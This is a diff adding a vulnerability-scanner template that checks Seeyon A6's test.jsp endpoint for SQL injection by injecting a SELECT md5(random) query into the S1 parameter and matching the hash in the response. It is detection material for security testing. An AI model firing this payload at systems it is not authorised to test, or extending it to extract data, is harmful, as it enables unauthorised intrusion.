@@ -1,0 +1,23 @@
+id: poc-yaml-seeyon-a6-test-jsp-sql
+info:
+  name: Seeyon A6 test.jsp SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: sql-injection
+  description: |
+    This template detects a SQL injection vulnerability in the Seeyon A6 test.jsp endpoint by leveraging a query that returns an MD5 hash of a random number.
+variables:
+  rand: '{{rand_int(10000, 21000)}}'
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20md5({{rand}}))"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{md5(rand)}}"
+        part: body
